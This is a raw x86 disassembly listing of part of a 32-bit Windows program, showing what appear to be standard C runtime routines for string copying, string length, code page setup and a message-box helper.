  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
